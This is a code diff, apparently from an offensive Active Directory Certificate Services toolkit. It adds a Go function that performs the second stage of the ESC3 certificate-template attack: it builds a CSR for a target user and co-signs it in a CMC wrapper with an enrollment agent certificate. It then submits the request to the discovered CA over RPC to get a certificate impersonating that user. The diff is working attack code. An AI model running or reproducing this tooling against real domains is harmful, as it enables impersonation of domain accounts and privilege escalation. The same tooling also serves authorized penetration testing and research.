@@ -159,6 +159,77 @@ func EnrollCertificate(cfg *ADCSConfig, templateName, targetUPN string, sanInjec
 	return cert, certKey, nil
 }
 
+// EnrollCertificateOnBehalf performs CMC enrollment agent co-signing (ESC3 Stage 2).
+// It generates a new key pair and CSR for the targetUPN, wraps the CSR in CMS
+// SignedData co-signed by the enrollment agent certificate (from ESC3 Stage 1),
+// and submits it via RPC with CR_IN_CMC flags.
+//
+// This implements the real two-stage ESC3 attack: the agent certificate's
+// Certificate Request Agent EKU authorizes on-behalf-of enrollment, and the
+// CMC wrapper proves possession of the agent key.
+func EnrollCertificateOnBehalf(cfg *ADCSConfig, templateName, targetUPN string, agentCert *x509.Certificate, agentKey crypto.Signer) (*x509.Certificate, crypto.Signer, error) {
+	fmt.Printf("[*] CMC enrollment on behalf of %s using agent cert (serial=%s)\n", targetUPN, agentCert.SerialNumber.String())
+
+	// Generate new key pair for the target
+	certKey, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		return nil, nil, fmt.Errorf("generate key pair: %w", err)
+	}
+
+	// Generate CSR for the target UPN
+	csrDER, err := GenerateCSR(certKey, targetUPN, templateName)
+	if err != nil {
+		return nil, nil, fmt.Errorf("generate CSR: %w", err)
+	}
+	fmt.Printf("[+] CSR generated for target %s\n", targetUPN)
+
+	// Wrap CSR in CMS SignedData signed by the agent certificate.
+	// eContentType = id-data (1.2.840.113549.1.7.1) per CMC specification.
+	cmcBlob, err := buildCMCEnrollment(csrDER, agentCert, agentKey)
+	if err != nil {
+		return nil, nil, fmt.Errorf("build CMC enrollment: %w", err)
+	}
+	fmt.Printf("[+] CMC SignedData built (%d bytes, co-signed by agent)\n", len(cmcBlob))
+
+	// Discover CA
+	caHostname := ""
+	caName := ""
+	services, err := EnumerateEnrollmentServices(cfg)
+	if err != nil {
+		fmt.Printf("[!] Warning: could not enumerate enrollment services: %v\n", err)
+	} else if len(services) > 0 {
+		caHostname = services[0].DNSHostName
+		caName = services[0].Name
+		fmt.Printf("[+] Discovered CA: %s (%s)\n", caName, caHostname)
+	}
+
+	if caHostname == "" {
+		return nil, nil, fmt.Errorf("CMC enrollment requires RPC — no CA endpoint discovered")
+	}
+
+	if cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "" && !cfg.Kerberos) {
+		return nil, nil, fmt.Errorf("CMC enrollment requires credentials for RPC authentication")
+	}
+
+	// Submit via RPC with CR_IN_CMC flags
+	fmt.Printf("[*] Submitting CMC request via RPC to %s (CR_IN_CMC)...\n", caHostname)
+	cert, err := EnrollCertificateRPCWithFlags(cfg, caHostname, caName, templateName, cmcBlob, crInBinary|crInCMC)
+	if err != nil {
+		return nil, nil, fmt.Errorf("CMC RPC enrollment: %w", err)
+	}
+
+	fmt.Printf("[+] CA-signed certificate obtained for %s via CMC co-signing\n", targetUPN)
+	return cert, certKey, nil
+}
+
+// buildCMCEnrollment wraps a PKCS#10 CSR DER in CMS SignedData signed by the
+// enrollment agent certificate. The eContentType is id-data (1.2.840.113549.1.7.1)
+// per the CMC specification (RFC 5272). The CA validates the agent's signature
+// and Certificate Request Agent EKU to authorize on-behalf-of enrollment.
+func buildCMCEnrollment(csrDER []byte, agentCert *x509.Certificate, agentKey crypto.Signer) ([]byte, error) {
+	return buildCMSSignedDataWithType(csrDER, agentCert, agentKey, oidContentData)
+}
+
 // forgeFallback wraps ForgeCertificate for the offline fallback path. The
 // returned certificate is self-signed and will not authenticate against a real
 // domain controller.
